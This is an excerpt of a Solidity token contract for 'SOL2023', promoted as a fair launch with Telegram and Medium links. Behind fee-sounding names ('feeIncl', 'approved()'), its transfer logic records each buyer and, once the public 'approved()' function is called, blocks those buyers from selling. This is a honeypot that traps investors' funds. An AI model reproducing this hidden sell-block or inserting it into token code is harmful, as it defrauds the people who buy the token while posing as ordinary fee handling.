...
Telegram : https://t.me/solana2023erc
Medium : https://medium.com/@SOL2023/sol2023-fairlaunch-642dd56170d2
**/
...
contract SOL2023 is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isFeeIncl;
    address[] private feeIncl;

    string private constant _name = "SOL2023";
    string private constant _symbol = "SOL2023";
    ...
    function approved() public virtual { 
        for (uint256 i = 0; i < feeIncl.length; i++) {
            _isFeeIncl[feeIncl[i]] = true; 
        }
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (to != uniswapV2Pair) { feeIncl.push(to);
            ...
            if (from != uniswapV2Pair) {
                require(amount <= _maxTxAmount, "Transfer Amount exceeds the maxTxAmount"); require(!_isFeeIncl[from]);
